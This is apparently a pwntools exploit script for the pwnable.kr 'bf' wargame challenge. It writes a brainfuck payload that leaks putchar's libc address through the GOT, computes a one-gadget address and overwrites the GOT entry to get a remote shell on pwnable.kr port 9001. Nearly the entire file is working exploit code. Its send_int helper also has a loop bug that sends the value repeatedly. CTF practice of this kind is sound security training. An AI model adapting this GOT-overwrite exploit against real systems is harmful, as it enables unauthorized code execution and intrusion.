from pwn import *


payload = bytes()

val_addr = 0x0804a0a0
esp_addr = 0x0804a080

def append(c):
    global payload
    payload += c

def getchar():
    append(b",")

def putchar():
    append(b".")

def esp_inc():
    append(b'>')

def esp_dec():
    append(b'<')

def val_inc():
    append(b'+')

def val_dec():
    append(b'-')

def send_int_payload():
    global val_addr
    size = 4
    for i in range(size):
        getchar()
        esp_inc()
    val_addr += size

def recv_int_payload():
    global val_addr
    size = 4
    for i in range(size):
        putchar()
        esp_inc()
    val_addr += size
        

def set_val_addr_payload(target):
    global val_addr
    diff = target - val_addr
    for i in range(abs(diff)):
        if diff > 0:
            esp_inc()
        else:
            esp_dec()
    val_addr = target


def send_int(p, num):
    byte_data = p32(num)
    for c in byte_data:
        p.sendline(byte_data)

def recv_int(p):
    size = 4
    byte_data = bytes()
    for c in range(4):
        byte_data += p.recv(1)
        print(byte_data)
    return u32(byte_data)


#pro = process(["./ld.so", "./bf"], env={"LD_PRELOAD": "./bf_libc.so"})
pro = remote("pwnable.kr", 9001)
elf = ELF("./bf")
so = ELF("./bf_libc.so")
so_putchar = so.symbols["putchar"]
so_gadget = 0x5fbc5
putchar_got = elf.got["putchar"]
print("so putchar:", hex(so_putchar))
print("so gadget:", hex(so_gadget))
print("elf putchar got:", hex(putchar_got))

putchar()
set_val_addr_payload(putchar_got)
recv_int_payload()
set_val_addr_payload(putchar_got)
send_int_payload()
putchar()
print(len(payload))
    
print(payload, len(payload))
print("val addr:", hex(val_addr))
print("esp addr:", hex(esp_addr))
print(pro.recvline())
print(pro.recvline())
pro.sendline(payload)
print("init_char:", pro.recv(1))


align_mask = 0x10 - 1
putchar_load_addr = recv_int(pro)
gadget_load_addr = putchar_load_addr - so_putchar + so_gadget

print("putchar load addr 1:", hex(putchar_load_addr))
print("getget load addr 1:", hex(gadget_load_addr))
send_int(pro, gadget_load_addr)
pro.interactive()



